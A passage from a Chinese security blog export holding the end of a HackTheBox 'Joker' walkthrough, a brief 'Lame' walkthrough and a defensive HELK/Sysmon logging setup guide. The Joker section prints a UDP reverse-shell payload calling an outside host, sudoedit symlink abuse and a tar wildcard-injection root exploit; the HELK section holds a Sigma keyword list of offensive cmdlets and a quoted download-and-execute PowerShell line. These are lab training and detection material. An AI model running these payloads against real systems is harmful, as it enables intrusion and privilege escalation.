<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tftp&gt; get &#x2F;etc&#x2F;passwd</span><br><span class="line">Error code 2: Access violation</span><br></pre></td></tr></table></figure>

<p>看来不能做到任意文件下载，尝试下载一些铭感文件，比如squid的配置文件</p>
<p>通过google搜索，可以发现suqid.conf的位置</p>
<p><img src="/images/Joker/3.png" alt="3"></p>
<p>尝试下载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get &#x2F;etc&#x2F;squid&#x2F;squid.conf</span><br></pre></td></tr></table></figure>

<p>之后可以发现凭据文件</p>
<p><img src="/images/Joker/4.png" alt="4"></p>
<p>尝试下载该文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get &#x2F;etc&#x2F;squid&#x2F;passwords</span><br></pre></td></tr></table></figure>

<p><img src="/images/Joker/5.png" alt="5"></p>
<p>得到</p>
<p><img src="/images/Joker/6.png" alt="6"></p>
<p>破解哈希</p>
<p><img src="/images/Joker/7.png" alt="7"></p>
<p>得到<code>kalamari/ihateseafood</code></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>配置使用对方的http代理</p>
<p><img src="/images/Joker/8.png" alt="8"></p>
<p>关闭本地apache2服务，访问<code>http://127.0.0.1</code>，注意Ctrl+F5清除本地缓存</p>
<p><img src="/images/Joker/9.png" alt="9"></p>
<p>得到了一个添加短网址页面</p>
<h3 id="流量操控"><a href="#流量操控" class="headerlink" title="流量操控"></a>流量操控</h3><p>我们需要对对方页面进行http枚举，需要进行流量操控技术，这里使用burp很方便</p>
<p>首先给burp使用http代理</p>
<p><img src="/images/Joker/10.png" alt="10"></p>
<p>接着添加监听8080和80端口，转发到本地80端口<br>虽然是转发到127.0.0.1端口，但流量应该为:访问本地80端口→经过burp的http proxy→到达对方本地80端口</p>
<p><img src="/images/Joker/11.png" alt="11"></p>
<p>这样添加了8080端口转发，我们就可以不用在浏览器上使用http代理，可以直接使用burp最为代理，可以正常进行抓包。<br>添加80端口转发，可以使用工具进行枚举，比如curl</p>
<p>burp能抓到包，并且正常返回对方的请求</p>
<p><img src="/images/Joker/12.png" alt="12"></p>
<p>这样就可以正常进行枚举http枚举了</p>
<p><img src="/images/Joker/13.png" alt="13"></p>
<p>发现<code>console</code></p>
<p><img src="/images/Joker/14.png" alt="14"></p>
<p>一个python shell页面，而且可以执行系统命令，但尝试了很多反弹shell，都不行</p>
<p>考虑防火墙等因素，尝试ping</p>
<p><img src="/images/Joker/15.png" alt="15"></p>
<p>成功捕获，看来有一些阻碍，尝试查看对方iptables设置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F;etc |grep iptables</span><br></pre></td></tr></table></figure>

<p><img src="/images/Joker/17.png" alt="17"></p>
<p>发现<code>/etc/iptables/rules.v4</code>，进行读取</p>
<p><img src="/images/Joker/16.png" alt="16"></p>
<p>看来没有可以反向shell的端口可以使用了，尝试使用UDP shell</p>
<p>payload，注意u参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">os.popen(&#39;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc -u 10.10.16.98 4444 &gt;&#x2F;tmp&#x2F;f&#39;).read()</span><br></pre></td></tr></table></figure>

<p>接受也要u参数，就能获取shell了</p>
<p><img src="/images/Joker/18.png" alt="18"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>由于禁止了tcp，所以文件传输有些麻烦，只能手动收集信息</p>
<p><img src="/images/Joker/19.png" alt="19"></p>
<p>查看sudo权限时，发现了一些奇怪的东西，之后方法来自IppSec</p>
<h3 id="user"><a href="#user" class="headerlink" title="user"></a>user</h3><h4 id="方法1-软连接"><a href="#方法1-软连接" class="headerlink" title="方法1 软连接"></a>方法1 软连接</h4><p>先移动到sudo需要的位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;testing&#x2F;test</span><br></pre></td></tr></table></figure>

<p>创建软连接，目标为用户的authorized_keys</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s &#x2F;home&#x2F;alekos&#x2F;.ssh&#x2F;authorized_keys layout.html</span><br></pre></td></tr></table></figure>

<p>接着以sudo编辑layout.html</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudoedit -u alekos &#x2F;var&#x2F;www&#x2F;testing&#x2F;test&#x2F;layout.html</span><br></pre></td></tr></table></figure>

<p>写入公钥</p>
<p><img src="/images/Joker/20.png" alt="20"></p>
<p>接着就能私钥连接过去了</p>
<p><img src="/images/Joker/21.png" alt="21"></p>
<h4 id="方法2-利用空格"><a href="#方法2-利用空格" class="headerlink" title="方法2 利用空格"></a>方法2 利用空格</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;home&#x2F;alekos			首先需要前提，能够进入alekos的主目录</span><br><span class="line">sudoedit -u alekos &#x2F;var&#x2F;www&#x2F; .ssh&#x2F;authorized_keys &#x2F;layout.html</span><br></pre></td></tr></table></figure>

<p>使用空格，满足sudo的路径要求，而sudoedit会把空格理解成编辑2个文件(第一个参数没指定文件)，就能顺利编辑相对路径<code>.ssh/authorized_keys</code>和绝对路径<code>/layout.html</code>了，也是可以写入公钥</p>
<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p>需要一些推测</p>
<p><img src="/images/Joker/22.png" alt="22"></p>
<p>在home目录下的backup里，发现一些.tar.gz压缩包，尝试解压</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar xvf dev-1603181401.tar.gz</span><br></pre></td></tr></table></figure>

<p>之后发现里面的文件似乎是home目录下的development的文件，而且从拥有者看，这个计划任务的执行者是root<br>而它有可能每5分钟执行一个这样的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -zcf &#x2F;home&#x2F;alekos&#x2F;backup&#x2F;&#96;date&#96;.tar.gz &#x2F;home&#x2F;alekos&#x2F;development&#x2F;*</span><br></pre></td></tr></table></figure>

<p>利用tar，我们进行通配符注入，利用文件名作为参数，来执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;rm &#x2F;tmp&#x2F;ff;mkfifo &#x2F;tmp&#x2F;ff;cat &#x2F;tmp&#x2F;ff|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc -u 10.10.16.98 4444 &gt;&#x2F;tmp&#x2F;ff&quot; &gt; shell.sh &amp;&amp;chmod +x shell.sh</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action&#x3D;exec&#x3D;sh shell.sh&quot;</span><br><span class="line">echo &quot;&quot; &gt; --checkpoint&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="/images/Joker/23.png" alt="23"></p>
<p>等5分钟</p>
<p><img src="/images/Joker/24.png" alt="24"></p>
<p>最后找到了backup.sh，和猜想差不多</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">FILENAME&#x3D;&quot;dev-$(date +%s).tar.gz&quot;</span><br><span class="line"></span><br><span class="line">cd &#x2F;home&#x2F;alekos&#x2F;development;</span><br><span class="line">tar cf &#x2F;home&#x2F;alekos&#x2F;backup&#x2F;$FILENAME *;</span><br><span class="line">chown root:alekos &#x2F;home&#x2F;alekos&#x2F;backup&#x2F;$FILENAME;</span><br><span class="line">chmod 640 &#x2F;home&#x2F;alekos&#x2F;backup&#x2F;$FILENAME;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Lame</title>
    <url>/2020/06/04/HTB-Lame/</url>
    <content><![CDATA[<h1 id="Lame"><a href="#Lame" class="headerlink" title="Lame"></a>Lame</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Lame/1.jpg" alt="1"></p>
<p>vsftpd 2.3.4</p>
<p>smb 3.0.20</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>ftp允许匿名登录，不过目录没有任何发现</p>
<p>smb没有发现可以查看的文件</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="版本漏洞"><a href="#版本漏洞" class="headerlink" title="版本漏洞"></a>版本漏洞</h3><p>根据服务vsftpd 2.3.4搜索漏洞</p>
<p><img src="/images/Lame/2.jpg" alt="2"></p>
<p>尝试使用该漏洞发现无法利用</p>
<p>尝试查找smb版本漏洞</p>
<p><img src="/images/Lame/3.jpg" alt="3"></p>
<p>发现msf也有现成可以使用的exp</p>
<p><img src="/images/Lame/4.jpg" alt="4"></p>
<p>成功使用EXP，而且竟然获取了root权限</p>
<p>最后升级交互式shell，获取flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Lame/5.jpg" alt="5"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>Hunting ELK初探</title>
    <url>/2021/01/29/HELK/</url>
    <content><![CDATA[<p><img src="/images/HELK/HELK-Design.png" alt="HELK-Design"></p>
<p>HutingELK是个基于ELK开源的具有高级分析功能的漏洞挖掘平台，这里主要用它来完成蓝队的工作</p>
<h1 id="架构简介"><a href="#架构简介" class="headerlink" title="架构简介"></a>架构简介</h1><p>ELK</p>
<p>Elasticsearch:一个搜索引擎，这里可以理解为数据库<br>Logstash:收集日志，并存入数据库<br>Kibana:将数据库内容web图形化</p>
<p>其他</p>
<p>Elastalert:检索数据库的内容，实时的发出警告<br>winlogbeat:windows的监控软件<br>kafka:数据分发</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>最好给虚拟机的内存开到6G以上，会出现各种神奇的问题以及卡顿</p>
<p>下载和运行安装程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Cyb3rWard0g&#x2F;HELK.git</span><br><span class="line">cd  HELK&#x2F;docker</span><br></pre></td></tr></table></figure>

<p>在运行安装程序后，可以监控日志，防止出现安装错误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tail -f &#x2F;var&#x2F;log&#x2F;helk-install.log</span><br></pre></td></tr></table></figure>

<p>安装之前，可以修改一下elasticsearch的内存配置，按照官方说法，测试用5G就行</p>
<p>修改<code>HELK/docker/helk-elasticsearch/config/jvm.options</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-Xms6g</span><br><span class="line">-Xmx6g</span><br></pre></td></tr></table></figure>

<p>之后的完整安装过程</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./helk_install.sh</span><br><span class="line">uthor: Roberto Rodriguez (@Cyb3rWard0g)  **</span><br><span class="line">** HELK build version: v0.1.9-alpha10082020 **</span><br><span class="line">** HELK ELK version: 7.6.2     **</span><br><span class="line">** License: GPL-3.0                          **</span><br><span class="line">***********************************************</span><br><span class="line"></span><br><span class="line">[HELK-INSTALLATION-INFO] HELK hosted on a Linux box</span><br><span class="line">[HELK-INSTALLATION-INFO] Available Memory: 7035 MBs</span><br><span class="line">[HELK-INSTALLATION-INFO] You&#x27;re using kali version 2020.3</span><br><span class="line"></span><br><span class="line">*****************************************************</span><br><span class="line">*      HELK - Docker Compose Build Choices          *</span><br><span class="line">*****************************************************</span><br><span class="line"></span><br><span class="line">1. KAFKA + KSQL + ELK + NGNIX</span><br><span class="line">2. KAFKA + KSQL + ELK + NGNIX + ELASTALERT</span><br><span class="line">3. KAFKA + KSQL + ELK + NGNIX + SPARK + JUPYTER</span><br><span class="line">4. KAFKA + KSQL + ELK + NGNIX + SPARK + JUPYTER + ELASTALERT</span><br><span class="line"></span><br><span class="line">Enter build choice [ 1 - 4]: 2					#选择2安装ELASTALERT</span><br><span class="line">[HELK-INSTALLATION-INFO] HELK build set to 2</span><br><span class="line">[HELK-INSTALLATION-INFO] Set HELK IP. Default value is your current IP: 192.168.110.3		#绑定IP</span><br><span class="line">[HELK-INSTALLATION-INFO] HELK IP set to 192.168.110.3</span><br><span class="line">[HELK-INSTALLATION-INFO] Please make sure to create a custom Kibana password and store it securely for future use.</span><br><span class="line">[HELK-INSTALLATION-INFO] Set HELK Kibana UI Password: hunting			#设置登录密码</span><br><span class="line">[HELK-INSTALLATION-INFO] Verify HELK Kibana UI Password: hunting</span><br><span class="line">[HELK-INSTALLATION-INFO] Docker already installed</span><br><span class="line">[HELK-INSTALLATION-INFO] Checking if it is installed via snap..</span><br><span class="line">[HELK-INSTALLATION-INFO] Assesing if Docker is running..</span><br><span class="line">[HELK-INSTALLATION-ERROR] Docker is not running. Attempting to start it..</span><br><span class="line">Synchronizing state of docker.service with SysV service script with /lib/systemd/systemd-sysv-install.</span><br><span class="line">Executing: /lib/systemd/systemd-sysv-install enable docker</span><br><span class="line">Created symlink /etc/systemd/system/multi-user.target.wants/docker.service → /lib/systemd/system/docker.service.</span><br><span class="line">[HELK-INSTALLATION-INFO] Docker is running</span><br><span class="line">[HELK-INSTALLATION-INFO] Making sure you assigned enough disk space to the current Docker base directory</span><br><span class="line">[HELK-INSTALLATION-INFO] Available Docker Disk: 77 GBs</span><br><span class="line">[HELK-INSTALLATION-INFO] Checking local vm.max_map_count variable and setting it to 4120294</span><br><span class="line">[HELK-INSTALLATION-INFO] Setting local vm.swappiness variable to 25</span><br><span class="line">[HELK-INSTALLATION-INFO] Building &amp; running HELK from helk-kibana-analysis-alert-basic.yml file..</span><br><span class="line">[HELK-INSTALLATION-INFO] Waiting for some services to be up .....</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">***********************************************************************************</span><br><span class="line">** [HELK-INSTALLATION-INFO] HELK WAS INSTALLED SUCCESSFULLY                      **</span><br><span class="line">** [HELK-INSTALLATION-INFO] USE THE FOLLOWING SETTINGS TO INTERACT WITH THE HELK **</span><br><span class="line">***********************************************************************************</span><br><span class="line"></span><br><span class="line">HELK KIBANA URL: https://192.168.110.3</span><br><span class="line">HELK KIBANA USER: helk</span><br><span class="line">HELK KIBANA PASSWORD: hunting</span><br><span class="line">HELK ZOOKEEPER: 192.168.110.3:2181</span><br><span class="line">HELK KSQL SERVER: 192.168.110.3:8088</span><br><span class="line"></span><br><span class="line">IT IS HUNTING SEASON!!!!!</span><br><span class="line"></span><br><span class="line">You can stop all the HELK docker containers by running the following command:</span><br><span class="line"> [+] sudo docker-compose -f helk-kibana-analysis-alert-basic.yml stop</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>安装完成后，就可以访问80端口，用户名和密码为<code>helk/hunting</code></p>
<p>简单规则探索</p>
<p>我们可以查看运行的容器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps |less -S</span><br><span class="line"></span><br><span class="line">docker ps | awk &#39;&#123;print $NF&#125;&#39;        </span><br><span class="line">NAMES</span><br><span class="line">helk-ksql-cli</span><br><span class="line">helk-ksql-server</span><br><span class="line">helk-kafka-broker</span><br><span class="line">helk-zookeeper</span><br><span class="line">helk-elastalert</span><br><span class="line">helk-logstash</span><br><span class="line">helk-nginx</span><br><span class="line">helk-kibana</span><br><span class="line">helk-elasticsearch</span><br></pre></td></tr></table></figure>

<p><img src="/images/HELK/1.png" alt="1"></p>
<h2 id="logstash"><a href="#logstash" class="headerlink" title="logstash"></a>logstash</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it helk-logstash &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>在<code>/usr/share/logstash/pipeline</code>存放了规则文件</p>
<p><img src="/images/HELK/2.png" alt="2"></p>
<p>注意这里文件名，前面有个数字，logstash会按照数字顺序进行逐一匹配。命中这些规则后，就会发往Elasticsearch</p>
<h2 id="elastalert"><a href="#elastalert" class="headerlink" title="elastalert"></a>elastalert</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it helk-elastalert &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>在<code>/opt/sigma/rules</code>存放了规则文件</p>
<p><img src="/images/HELK/3.png" alt="3"></p>
<p>比如捕获Nishang攻击的规则</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title: Malicious Nishang PowerShell Commandlets</span><br><span class="line">id: f772cee9-b7c2-4cb2-8f07-49870adc02e0</span><br><span class="line">status: experimental</span><br><span class="line">description: Detects Commandlet names and arguments from the Nishang exploitation framework</span><br><span class="line">date: 2019&#x2F;05&#x2F;16</span><br><span class="line">references:</span><br><span class="line">    - https:&#x2F;&#x2F;github.com&#x2F;samratashok&#x2F;nishang</span><br><span class="line">tags:</span><br><span class="line">    - attack.execution</span><br><span class="line">    - attack.t1059.001</span><br><span class="line">    - attack.t1086  #an old one</span><br><span class="line">author: Alec Costello</span><br><span class="line">logsource:</span><br><span class="line">    product: windows</span><br><span class="line">    service: powershell</span><br><span class="line">    definition: It is recommanded to use the new &quot;Script Block Logging&quot; of PowerShell v5 https:&#x2F;&#x2F;adsecurity.org&#x2F;?p&#x3D;2277</span><br><span class="line">detection:</span><br><span class="line">    keywords:</span><br><span class="line">        - Add-ConstrainedDelegationBackdoor</span><br><span class="line">        - Set-DCShadowPermissions</span><br><span class="line">        - DNS_TXT_Pwnage</span><br><span class="line">        - Execute-OnTime</span><br><span class="line">        - HTTP-Backdoor</span><br><span class="line">        - Set-RemotePSRemoting</span><br><span class="line">        - Set-RemoteWMI</span><br><span class="line">        - Invoke-AmsiBypass</span><br><span class="line">        - Out-CHM</span><br><span class="line">        - Out-HTA</span><br><span class="line">        - Out-SCF</span><br><span class="line">        - Out-SCT</span><br><span class="line">        - Out-Shortcut</span><br><span class="line">        - Out-WebQuery</span><br><span class="line">        - Out-Word</span><br><span class="line">        - Enable-Duplication</span><br><span class="line">        - Remove-Update</span><br><span class="line">        - Download-Execute-PS</span><br><span class="line">        - Download_Execute</span><br><span class="line">        - Execute-Command-MSSQL</span><br><span class="line">        - Execute-DNSTXT-Code</span><br><span class="line">        - Out-RundllCommand</span><br><span class="line">        - Copy-VSS</span><br><span class="line">        - FireBuster</span><br><span class="line">        - FireListener</span><br><span class="line">        - Get-Information</span><br><span class="line">        - Get-PassHints</span><br><span class="line">        - Get-WLAN-Keys</span><br><span class="line">        - Get-Web-Credentials</span><br><span class="line">        - Invoke-CredentialsPhish</span><br><span class="line">        - Invoke-MimikatzWDigestDowngrade</span><br><span class="line">        - Invoke-SSIDExfil</span><br><span class="line">        - Invoke-SessionGopher</span><br><span class="line">        - Keylogger</span><br><span class="line">        - Invoke-Interceptor</span><br><span class="line">        - Create-MultipleSessions</span><br><span class="line">        - Invoke-NetworkRelay</span><br><span class="line">        - Run-EXEonRemote</span><br><span class="line">        - Invoke-Prasadhak</span><br><span class="line">        - Invoke-BruteForce</span><br><span class="line">        - Password-List</span><br><span class="line">        - Invoke-JSRatRegsvr</span><br><span class="line">        - Invoke-JSRatRundll</span><br><span class="line">        - Invoke-PoshRatHttps</span><br><span class="line">        - Invoke-PowerShellIcmp</span><br><span class="line">        - Invoke-PowerShellUdp</span><br><span class="line">        - Invoke-PSGcat</span><br><span class="line">        - Invoke-PsGcatAgent</span><br><span class="line">        - Remove-PoshRat</span><br><span class="line">        - Add-Persistance</span><br><span class="line">        - ExetoText</span><br><span class="line">        - Invoke-Decode</span><br><span class="line">        - Invoke-Encode</span><br><span class="line">        - Parse_Keys</span><br><span class="line">        - Remove-Persistence</span><br><span class="line">        - StringtoBase64</span><br><span class="line">        - TexttoExe</span><br><span class="line">        - Powerpreter</span><br><span class="line">        - Nishang</span><br><span class="line">        - EncodedData</span><br><span class="line">        - DataToEncode</span><br><span class="line">        - LoggedKeys</span><br><span class="line">        - OUT-DNSTXT</span><br><span class="line">        - Jitter</span><br><span class="line">        - ExfilOption</span><br><span class="line">        - Tamper</span><br><span class="line">        - DumpCerts</span><br><span class="line">        - DumpCreds</span><br><span class="line">        - Shellcode32</span><br><span class="line">        - Shellcode64</span><br><span class="line">        - NotAllNameSpaces</span><br><span class="line">        - exfill</span><br><span class="line">        - FakeDC</span><br><span class="line">        - Exploit</span><br><span class="line">    condition: keywords</span><br><span class="line">falsepositives:</span><br><span class="line">    - Penetration testing</span><br><span class="line">level: high</span><br></pre></td></tr></table></figure>

<h1 id="windows客户端配置"><a href="#windows客户端配置" class="headerlink" title="windows客户端配置"></a>windows客户端配置</h1><h2 id="sysmon"><a href="#sysmon" class="headerlink" title="sysmon"></a>sysmon</h2><p>准备在windows上安装sysmon，不过在此之前，我们可以先去寻找一些配置好的规则文件:<a href="https://github.com/olafhartong/sysmon-modular">链接</a></p>
<p>管理sysmon的规则文件是个非常痛苦的事情，它的规则文件非常多，而该项目以模块化，让我们能可以挑选想要的功能</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&gt; git clone https:&#x2F;&#x2F;github.com&#x2F;olafhartong&#x2F;sysmon-modular.git</span><br><span class="line">$&gt; cd sysmon modular</span><br><span class="line">$&gt; . .\Merge-SysmonXml.ps1</span><br><span class="line">$&gt; Merge-AllSysmonXml -Path ( Get-ChildItem &#39;[0-9]*\*.xml&#39;) -AsString | Out-File sysmonconfig.xml</span><br><span class="line">#这里我们选择所有的xml</span><br></pre></td></tr></table></figure>

<p>这里的新生成的<code>sysmonconfig.xml</code>就是我们期望的</p>
<p>接下来准备下载sysmon，可以去微软官网下载，或者在SysinternalsSuite全家桶里就有</p>
<p>把<code>sysmonconfig.xml</code>和sysmon放在同一目录下，执行命令安装服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\BypassAV\Desktop\Sysmon&gt;Sysmon64.exe -i sysmonconfig.xml</span><br><span class="line"></span><br><span class="line">﻿</span><br><span class="line">System Monitor v13.01 - System activity monitor</span><br><span class="line">Copyright (C) 2014-2021 Mark Russinovich and Thomas Garnier</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span class="line"></span><br><span class="line">Loading configuration file with schema version 4.50</span><br><span class="line">Configuration file validated.</span><br><span class="line">Sysmon64 installed.</span><br><span class="line">SysmonDrv installed.</span><br><span class="line">Starting SysmonDrv.</span><br><span class="line">SysmonDrv started.</span><br><span class="line">Starting Sysmon64..</span><br><span class="line">Sysmon64 started</span><br><span class="line"></span><br><span class="line">C:\Users\BypassAV\Desktop\Sysmon&gt;sc qc Sysmon64</span><br><span class="line">[SC] QueryServiceConfig 成功</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: Sysmon64</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START								#服务已经配置为自启动</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\Windows\Sysmon64.exe</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Sysmon64</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>

<p>安装完成后可以在eventvwr中:应用程序和服务日志→Microsoft→Windows→Sysmon→Operational  进行查看</p>
<h2 id="其他日志"><a href="#其他日志" class="headerlink" title="其他日志"></a>其他日志</h2><p>除了sysmon，还要获取其他日志</p>
<p>打开mmc→文件→添加/删除管理单元→本地计算机策略</p>
<p><img src="/images/HELK/4.png" alt="4"></p>
<p>开启记录进程创建日志(可以用来记录CMD命令)</p>
<p><img src="/images/HELK/5.png" alt="5"></p>
<p>开启:审核: 强制审核策略子类别设置(Windows Vista 或更高版本)可替代审核策略类别设置(防止旧的传统类别策略覆盖审核策略子类别)</p>
<p><img src="/images/HELK/6.png" alt="6"></p>
<p>开启:在过程创建事件中加入命令行(配合之前的审核进程创建日志，输出更详细的信息)</p>
<p><img src="/images/HELK/7.png" alt="7"></p>
<p>开启powershell日志</p>
<p><img src="/images/HELK/8.png" alt="8"></p>
<p>开启powershell脚本日志</p>
<p><img src="/images/HELK/9.png" alt="9"></p>
<p>其余的两项powershell设置不用管，分别是</p>
<p>打开powershell转换:将powershell脚本的输出，保存到一个目录(这里使用日志，就不需要它了)<br>启用脚本执行:限制一些powershell脚本的运作，如只允许运行签名后的powershell脚本运行</p>
<p>最后创建profile.ps1(profile.ps1是powershell的配置文件，会在启动powershell时加载)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$LogCommandLifeCycleEvent&#x3D;$true		#记录命令的开始和结束</span><br><span class="line">$LogCommandHealthEvent&#x3D;$true		#记录错误的命令</span><br></pre></td></tr></table></figure>

<p>放在$PSHOME(即C:\Windows\System32\WindowsPowerShell\v1.0)</p>
<h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p>打开taskschd.msc，开启所有任务历史记录</p>
<p><img src="/images/HELK/10.png" alt="10"></p>
<h2 id="安装winlogbeat"><a href="#安装winlogbeat" class="headerlink" title="安装winlogbeat"></a>安装winlogbeat</h2><p>设置winlogbeat.yml，内容如下(需要修改运行kafka的IP地址)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">###################### Winlogbeat Configuration Example #########################</span><br><span class="line"># Winlogbeat 6, 7, and 8 are currently supported!</span><br><span class="line"># You can download the latest stable version of winlogbeat here:</span><br><span class="line"># https:&#x2F;&#x2F;www.elastic.co&#x2F;downloads&#x2F;beats&#x2F;winlogbeat</span><br><span class="line"></span><br><span class="line"># For simplicity&#x2F;brevity we have only enabled the options necessary for sending windows logs to HELK.</span><br><span class="line"># Please visit the Elastic documentation for the complete details of each option and full reference config:</span><br><span class="line"># https:&#x2F;&#x2F;www.elastic.co&#x2F;guide&#x2F;en&#x2F;beats&#x2F;winlogbeat&#x2F;current&#x2F;winlogbeat-reference-yml.html</span><br><span class="line"></span><br><span class="line">#-------------------------- Windows Logs To Collect -----------------------------</span><br><span class="line">winlogbeat.event_logs:</span><br><span class="line">  - name: Application</span><br><span class="line">    ignore_older: 30m</span><br><span class="line">  - name: Security</span><br><span class="line">    ignore_older: 30m</span><br><span class="line">  - name: System</span><br><span class="line">    ignore_older: 30m</span><br><span class="line">  - name: Microsoft-windows-sysmon&#x2F;operational</span><br><span class="line">    ignore_older: 30m</span><br><span class="line">  - name: Microsoft-windows-PowerShell&#x2F;Operational</span><br><span class="line">    ignore_older: 30m</span><br><span class="line">    event_id: 4103, 4104</span><br><span class="line">  - name: Windows PowerShell</span><br><span class="line">    event_id: 400,600</span><br><span class="line">    ignore_older: 30m</span><br><span class="line">  - name: Microsoft-Windows-WMI-Activity&#x2F;Operational</span><br><span class="line">    event_id: 5857,5858,5859,5860,5861</span><br><span class="line"></span><br><span class="line">#----------------------------- Kafka output --------------------------------</span><br><span class="line">output.kafka:</span><br><span class="line">  # initial brokers for reading cluster metadata</span><br><span class="line">  # Place your HELK IP(s) here (keep the port).</span><br><span class="line">  # If you only have one Kafka instance (default for HELK) then remove the 2nd IP that has port 9093</span><br><span class="line">  hosts: [&quot;192.168.110.3:9092&quot;]</span><br><span class="line">  topic: &quot;winlogbeat&quot;</span><br><span class="line">  ############################# HELK Optimizing Latency ######################</span><br><span class="line">  max_retries: 2</span><br><span class="line">  max_message_bytes: 1000000</span><br></pre></td></tr></table></figure>

<h1 id="HELK"><a href="#HELK" class="headerlink" title="HELK"></a>HELK</h1><p>之后访问sysmon dashboard</p>
<p><img src="/images/HELK/13.png" alt="13"></p>
<p>成功运行了，但缺失了一些东西，我安装的sysmon版本为v13.01，和手册上的版本不太一样，不确定是不是其他地方可能出现的问题，但是没有影响到我之后的使用</p>
<p>接下来就是对过滤器的使用，比如我们在黑客在受害者的机器上创建了用户test，我们在helk上过滤<code>process_parent_command_line</code>可以看到</p>
<p><img src="/images/HELK/14.png" alt="14"></p>
<p>打开之后可以获得更多信息</p>
<p><img src="/images/HELK/15.png" alt="15"></p>
<h2 id="小测试"><a href="#小测试" class="headerlink" title="小测试"></a>小测试</h2><p>假设攻击者通过某个手段获取<strong>reverse shell</strong>，执行命令<code>iex(new-object net.webclient).downloadString(&#39;http://192.168.110.3:9001/winpriv/Sherlock.ps1&#39;);Find-AllVulns</code>通过sherlock，完成kernel exploit攻击，之后想要使用<code>mimikatz</code>进行后渗透攻击</p>
<p>显示<strong>event_original_message</strong>字段</p>
<p>发现了加载远程ps1脚本</p>
<p><img src="/images/HELK/16.png" alt="16"></p>
<p>发现mimikatz的传输和运行<br>另外也可以在另一个地方发现mimikatz调用了SeDebugPrivilege</p>
<p><img src="/images/HELK/17.png" alt="17"></p>
<h2 id="elasticalert"><a href="#elasticalert" class="headerlink" title="elasticalert"></a>elasticalert</h2><p>查看<strong>Rulename</strong>可以发现一警告，比如我们创建服务触发了<code>elasticalert</code>有关服务的规则</p>
<p><img src="/images/HELK/18.png" alt="18"></p>
<h1 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h1><p>加固HELK，向生产环境靠近 (modsecurity，反向代理，HTTPS，Linux服务器加固…)</p>
<p>logstash、elastalert规则编写</p>
]]></content>
      <categories>
        <category>BlueTeam</category>
      </categories>
      <tags>
        <tag>EDR</tag>
      </tags>
